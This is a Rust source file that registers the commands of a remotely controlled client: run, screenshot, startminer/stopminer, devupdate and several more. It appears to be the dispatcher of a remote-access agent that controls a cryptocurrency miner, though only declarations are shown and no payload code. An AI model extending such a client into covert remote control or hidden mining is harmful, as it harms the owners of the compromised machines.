mod checkupdates;
mod devupdate;
mod disconnect;
mod help;
mod minerstatus;
mod msg;
mod ping;
mod reconnect;
mod run;
mod screenshot;
mod startminer;
mod stat;
mod stopminer;
mod version;

use std::{any::Any, fmt};

use async_trait::async_trait;

use self::{
    checkupdates::*, devupdate::*, disconnect::*, help::*, minerstatus::*, msg::*, ping::*, reconnect::*, run::*,
    screenshot::*, startminer::*, stat::*, stopminer::*, version::*,
};
use crate::client::Client;

#[async_trait]
pub trait Command: Any + Send + Sync {
    fn name(&self) -> String;

    fn help(&self) -> String;

    fn min_args(&self) -> usize;

    async fn execute(&self, client: &mut Client, args: Vec<&str>) -> anyhow::Result<()>;
}

#[derive(Default)]
pub struct CommandsManager {
    pub commands: Vec<Box<dyn Command>>,
}

pub fn ok<S>(message: S) -> String
where
    S: ToString + fmt::Display,
{
    format!("[0]{}", message)
}

#[allow(dead_code)]
pub fn error<S>(message: S) -> String
where
    S: ToString + fmt::Display,
{
    format!("[1]{}", message)
}

impl CommandsManager {
    pub fn new() -> Self {
        Self {
            // Don't forget to add commands to the Vec!
            commands: vec![
                Box::new(Msg),
                Box::new(Stat),
                Box::new(Run),
                Box::new(Reconnect),
                Box::new(Screenshot),
                Box::new(Startminer),
                Box::new(Stopminer),
                Box::new(MinerStatus),
                Box::new(Disconnect),
                Box::new(DevUpdate),
                Box::new(CheckUpdates),
                Box::new(Ping),
                Box::new(Version),
                Box::new(Help),
            ],
        }
    }
}

mod prelude {
    pub use async_trait::async_trait;

    pub use super::*;
    pub use crate::client::Client;
    pub extern crate anyhow;

    pub use tracing::*;
    pub use wpkg_crypto::*;
    pub use wpkg_macro::*;

    pub use crate::{crypto, utils::*};
}
